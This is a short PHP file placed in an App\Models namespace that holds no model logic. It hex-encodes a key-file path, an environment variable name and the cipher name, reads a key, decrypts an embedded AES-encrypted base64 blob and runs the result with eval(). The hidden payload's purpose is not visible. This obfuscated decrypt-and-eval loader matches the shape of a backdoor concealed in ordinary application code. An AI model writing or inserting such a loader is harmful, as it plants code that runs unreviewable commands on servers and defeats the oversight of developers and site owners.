<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('HgWL8jhEnrEtQbqXFztKUQ==');

$c=base64_decode(

'QwB5K33Sop6q2g55jtHzB5r3WzdriOoduYUO+WG1rPrunGmmlMo7BahSuaEXpwB8DT0AsYqBmbd+' .
'DBVJ9GHSGlO76W6FxbblZRr+xgiNUTU6zQh7G1Ygp9hiV4QMimUDKYr4Upis4xuebjT8aih51228' .
'b7uYAVVhwBs+HEacxUK0urjDR/z1HeQOED77TQFQmlJLS+L2SzXHlziJjxTUtJaORfmubBm8DrVv' .
'dnUPJ4a3B3kI67phaDXFe2tDuhO5WOo5Y8pHb3O7VJz2sLOBKIa5X6i2rqExsxjLWpnhTIQl2e31' .
'U9GxgHzwXs9kTCYlrNW3/AcRFKWouSyeLw807Vpa9sXEtpGXYbURdFZ8zTgL9COgjd1g5fNxAIkr' .
'u6oVg6jsiMrCxZAbpkmcm8J/R4QZdcznN0u3C0GiTc0eqHGLmAP6n1NVsMsmYz0IpRMVM/Y9pDzg' .
'rotT/ge7qmN8usM0OO8rkeLDNrGipPgUf8k3225b1j4tixLea+MUkDQZ+dsuwMO6HmN53vIS6cct' .
'8AvwRNqwyOciSQNJbVClULkx73hl0C/lMgqXJHw5K41wJjkxtHvjqXwQWS8skiKt6kF6vgC+9pKs' .
'tYrSHyoqgAMjIG4hhLegGhcmd/ZnDW6SWTgQLVDpF1lCAI5KtMnVzxZ61sDWVK25DyyKDo9poEtO' .
'BJWEBiB6LTArWA3fqZfkCWznwCxnAU7bfwIAy6S/ie79geHmp/EgOqCxSvoekvIrCueDB8UMlHv7' .
'buqF+eWUk/N+mo6vXVKcHELXcXVL1cZOu6yP7v40wzCzbzTd/kMU609mrPC/qNqUyWuNZOOCW6fI' .
'MfXvXY4mJ3OYhXFIDQfyqKwT0t9rAxN4tYFLTYUoYWZufTZJubXXXPsFYCjMdo/AlS4IUQgoQkCm' .
'0hJMuQA2jJBd6P8Mzi9GwcHQcCAV16gk2g5N/0whn6mCAuRPFZqWA1KJJ9Wofsv00PvdCw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

